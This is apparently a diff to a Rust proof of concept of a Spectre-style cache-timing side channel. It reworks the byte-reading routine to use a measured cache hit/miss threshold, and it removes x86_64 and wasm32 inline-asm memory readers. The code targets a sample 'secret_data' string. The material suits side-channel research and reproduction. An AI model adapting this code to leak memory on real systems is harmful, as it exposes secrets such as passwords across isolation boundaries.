@@ -1,5 +1,6 @@
 #![feature(asm_experimental_arch)]
 
+use reproduction::*;
 use std::arch::asm;
 #[cfg(all(target_arch = "x86_64"))]
 use std::arch::x86_64::_mm_clflush;
@@ -39,41 +40,6 @@ const secret_data: &str = "My password";
 // To avoid optimization of the victim code
 static mut tmp: u8 = 0;
 
-#[cfg(all(target_arch = "x86_64"))]
-fn read_memory_offset(ptr: *const u8) -> u8 {
-    let result: u8 = 0;
-    unsafe {
-        asm!(
-            "mov {result}, [{x}]",
-            x = in(reg) ptr,
-            result = out(reg_byte) _
-        );
-    };
-    result
-}
-
-#[cfg(all(target_arch = "wasm32"))]
-#[no_mangle]
-fn read_memory_offset(ptr: *const u8) -> u8 {
-    let mut result = 0u8;
-    //println!("Reading from memory");
-    unsafe {
-        asm!(
-            // Push the ptr in the stack
-            "local.get {}",
-            "i32.load8_u 0",
-            //"i32.load8_u",
-            "local.set {}",
-            in(local) ptr,
-            lateout(local) result,
-            //result = out(reg_byte) _
-            options(nostack),
-
-        );
-    };
-    result
-}
-
 #[no_mangle]
 #[allow(dead_code)]
 fn victim_code(branch_selector: usize) {
@@ -92,7 +58,7 @@ fn victim_code(branch_selector: usize) {
 // Returns the best two indexes and the best two values
 #[no_mangle]
 #[allow(dead_code)]
-fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
+fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64; 2]) {
     let mut latencies = [0; 256];
     let mut scores = [0u64; 256];
 
@@ -165,35 +131,11 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
                 tmp &= read_memory_offset(addr);
                 _rdtsc() - start
             };
-            latencies[mix_i] += end;
-            /*if end < THRESHOLD {
+
+            if end < (90 * hit + 10 * miss) / 100 {
                 scores[mix_i] += 1;
             }
-            #[cfg(feature = "tracing")]
-            {
-                latencies[mix_i] = end;
-            }*/
         }
-
-        let mut sum = 0;
-        for l in latencies {
-            sum += l;
-        }
-        //let avg = sum / 256;
-        for (i, l) in latencies.iter().enumerate() {
-            if 255 * l < 3 * sum / 4 {
-                scores[i] += 1;
-            }
-        }
-
-        /*#[cfg(feature = "tracing")]
-        for l in latencies {
-            eprint!("{}, ", l);
-        }
-        #[cfg(feature = "tracing")]
-        {
-            eprintln!("],");
-        }*/
 
         for j in 0..256 {
             // Get the best and the second best
@@ -218,12 +160,6 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
 
         value[0] = max1 as u64;
         value[1] = max2 as u64;
-
-        /*if scores[max1 as usize] > 2 * scores[max2 as usize] {
-            #[cfg(feature = "tracing")]
-            println!("Breaking");
-            break;
-        }*/
     }
 
     #[cfg(feature = "tracing")]
@@ -275,8 +211,9 @@ pub fn main() {
         public_data[15] = 16;
     }
 
+    let (hit, miss) = reproduction::get_cache_time(&array_for_prediction);
     for j in 0..11 {
-        let (score, value) = read_memory_byte(j);
+        let (score, value) = read_memory_byte(j, hit, miss);
         // get value 0 as char
         let ch = value[0] as u8 as char;
         let ch2 = value[1] as u8 as char;
